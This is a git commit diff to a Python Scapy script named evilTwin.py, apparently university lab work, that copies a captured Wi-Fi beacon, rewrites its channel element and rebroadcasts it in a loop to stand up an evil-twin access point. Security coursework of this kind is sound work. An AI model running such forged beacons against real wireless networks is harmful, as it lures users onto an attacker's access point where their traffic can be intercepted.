958a3c3a33d8f73f76f6348de96c3f7404cfd333
Mickael Bonjour <mickael.bonjour@heig-vd.ch>
2020-03-09 13:52:02 +0100

    Version of the evilTwin

--- evilTwin.py
+++ evilTwin.py
@@ -36,9 +36,9 @@ print("Actual Channel : ", pktSource[Dot11Beacon].network_stats().get("channel")
 channel = pktSource[Dot11Beacon].network_stats().get("channel")
 #print(ls(pktSource))
 newPkt = pktSource.copy()
-#newPkt[Dot11Elt].payload.payload.info = chr((channel + 6) % 11)
+#newPkt[Dot11Elt][3] = chr((channel + 6) % 11)
 #p = pktSource[Dot11Elt].payload
-#last = Dot11Elt(pktSource[Dot11Elt])
+#last = Dot11Elt(ID=pktSource[Dot11Elt].ID, info=pktSource[Dot11Elt].info, len=pktSource[Dot11Elt].len)
 #while isinstance(p, Dot11Elt):
 #    if p.ID == 3:
 #        p = p.payload
@@ -47,10 +47,11 @@ newPkt = pktSource.copy()
 #    last /= Dot11Elt(ID=p.ID, info=p.info, len=p.len)
 #    p = p.payload
 
-#newPkt[Dot11Elt] = last/Dot11Elt(ID="DSset", info=chr((channel + 6)%13))/p
+#newPkt[Dot11Elt] = last/Dot11Elt(ID="DSset", info=chr((channel + 6)%13), len=1)/p
+#newnewPkt = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid_list[evilTwinTarget], addr3=bssid_list[evilTwinTarget]) / newPkt[Dot11Beacon] / newPkt[Dot11Elt]
 newPkt = newPkt/Dot11Elt(ID="DSset", info=chr((channel + 6)%13))
 #print(pktSource.show())
 #print(newPkt.show())
 newChannel = newPkt[Dot11Beacon].network_stats().get("channel")
 print("New Channel : ", newChannel)
-sendp(newPkt, inter=0.001,loop=1, iface=interface)
+sendp(newPkt, inter=0.01,loop=1, iface=interface)
